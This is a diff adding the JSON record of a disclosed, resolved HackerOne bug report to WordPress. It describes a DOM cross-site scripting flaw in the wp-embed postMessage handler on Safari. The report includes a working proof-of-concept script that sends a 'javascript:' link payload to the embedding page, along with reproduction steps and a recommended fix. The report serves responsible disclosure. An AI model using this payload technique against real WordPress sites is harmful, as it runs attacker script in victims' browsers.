@@ -1,0 +1,149 @@
+{
+  "id": 1238528,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjM4NTI4",
+  "url": "https://hackerone.com/reports/1238528",
+  "title": "wp-embed XSS on Safari",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2021-06-20T02:26:46.244Z",
+  "submitted_at": "2021-06-20T02:26:46.395Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "zoczus",
+    "url": "/zoczus",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/8774a5031fc14b74dc4404da039040c69df8ed41021007c0c2beb9de489fcf66"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-07-01T11:34:07.022Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-06-01T11:34:05.419Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello! I'd like to report an XSS vulberability which works only on Safari browser (and maybe on others which I didn't checked. It defo doesn't work on both Chrome and Firefox). The other requirement which need to be met is attacker's blog post being embed on destination (victim) blog. \n\n## Analysis\n\nLet's take a look to the core of problem - JavaScript postMessage handler: \n\n```javascript\n     if (c.wp.receiveEmbedMessage = function(e) {\n            var t = e.data;\n            if (t)\n                if (t.secret || t.message || t.value)\n                    if (!/[^a-zA-Z0-9]/.test(t.secret)) {\n                        for (var r, a, i, s = d.querySelectorAll('iframe[data-secret=\"' + t.secret + '\"]'), n = d.querySelectorAll('blockquote[data-secret=\"' + t.secret + '\"]'), o = 0; o < n.length; o++)\n                            n[o].style.display = \"none\";\n                        for (o = 0; o < s.length; o++)\n                            if (r = s[o],\n                            e.source === r.contentWindow) {\n                                if (r.removeAttribute(\"style\"),\n                                \"height\" === t.message) {\n                                    if (1e3 < (i = parseInt(t.value, 10)))\n                                        i = 1e3;\n                                    else if (~~i < 200)\n                                        i = 200;\n                                    r.height = i\n                                }\n                                if (\"link\" === t.message)\n                                    if (a = d.createElement(\"a\"),\n                                    i = d.createElement(\"a\"),\n                                    a.href = r.getAttribute(\"src\"),\n                                    i.href = t.value,\n                                    i.host === a.host)\n                                        if (d.activeElement === r)\n                                            c.top.location.href = t.value\n                            }\n                    }\n        }\n```\n\nThings need to be noticed: \n\n- Secret need to be known (but it's provided as location.hash of embed webpage, so it's not a problem)\n- Only content window can send postMessages (which is cool, as it's attacker website)\n- If **message** attribute of postMessage data has `link` value - crazy things are happening\n- most important ```c.top.location.href = t.value``` where `t` is postMessage data controlled by attacker. \n\nThe last point obviously can lead to XSS if attacker will use ```javascript:alert(document.domain)``` as `t.value`, however - before it happen important check is made:\n\n```javascript\n     if (a = d.createElement(\"a\"),\n                                    i = d.createElement(\"a\"),\n                                    a.href = r.getAttribute(\"src\"),\n                                    i.href = t.value,\n                                    i.host === a.host)\n```\n\nThis code checks if **hostname** provided in ```t.value``` is the same as **hostname** of embed page. It create `<a>` element, but `t.value` as `href` attribute and then - takes `host` attribute of created URL. This approach is of course way better than some regexp magic ;-) but there's a behavior specific in Safari browser:\n\n```\n> var a = document.createElement(\"a\")\n> a.href=\"javascript://google.com/%0aalert(document.domain);//\"\n> console.log(a.host)\n< google.com\n```\n\nAll other browsers return empty string in case of using `javascript:` scheme, but not Safari. :) This could lead attacker to use `javascript` schema and execute javascript code in top window (victim's blog)\n\n\n## Steps To Reproduce:\n\n1. Get evil wordpress instance ;-) \n2. Edit `wordpress/wp-includes/theme-compat/embed.php` file and add your custom HTML code:\n\n```html\n<script>\nif(document.location.hash.indexOf(\"secret\") != -1) {\n  secret = document.location.hash.split(\"=\")[1];\n  window.top.postMessage({\"secret\":secret,\"message\":\"link\",\"value\":\"javascript://\"+document.location.host+\"/%0aalert(document.domain);//\"},\"*\");\n}\n</script>\n```\n3. Create any post on attacker blog, publish it and get it's URL.\n4. On victim wordpress site (Safari) add new post with embed post from victim wordpress\n5. Alert executed. :) \n\nSample blogpost that can be embedded: `https://ropchain.org/lab/wordpress/2021/06/20/embed-me/`\n\n## Recommendations\n\nIt's recommended to also validate schema of links and allow only HTTP / HTTPS links in postMessages.\n\n## Impact\n\nAbility to execute JavaScript code on wordpress page which embeded attacker's blogpost. \n\nPlease assign CVE identifier to this vulnerability. While crediting it, please use:\n\n*Jakub Żoczek, Senior Security Researcher @ Securitum [https://securitum.pl/](https://securitum.pl/)*\n\nAll the best!",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-07-01T11:34:05.635Z",
+  "allow_singular_disclosure_after": -89529721.72156695,
+  "singular_disclosure_allowed": true,
+  "vote_count": 47,
+  "voters": [
+    "anhiu102",
+    "awhacken",
+    "drsniper",
+    "zy9ard3",
+    "shreyaschavhan",
+    "encodedguy",
+    "zoczus",
+    "shubham_srt",
+    "f_m",
+    "ysthas",
+    "and 37 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2750,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "WordPress Core",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 301100,
+      "category": "researcher",
+      "content": "Invalid postMessage origin check implementation in WordPress open embed auto discovery function allows potential attacker to execute malicious JavaScript code. \n\nDetailed write-up: https://research.securitum.com/xss-in-wordpress-via-open-embed-auto-discovery/",
+      "updated_at": "2023-06-01T11:33:54.863Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 124,
+        "username": "zoczus",
+        "name": "Jakub Żoczek",
+        "bio": "Senior Security Researcher @ Securitum",
+        "cleared": false,
+        "verified": false,
+        "website": "https://research.securitum.com/",
+        "location": "Poland",
+        "created_at": "2013-11-06T22:45:53.284Z",
+        "url": "https://hackerone.com/zoczus",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/8774a5031fc14b74dc4404da039040c69df8ed41021007c0c2beb9de489fcf66",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/83a62d03223573cfc0f155a612b2adb97f819481786b8f5c531134ea426ed026",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/0edb7ad7ad0f50cf9c2e69c89ae9c522e7e14267ff47e234065e04398e7425fd"
+        }
+      }
+    }
+  ]
+}
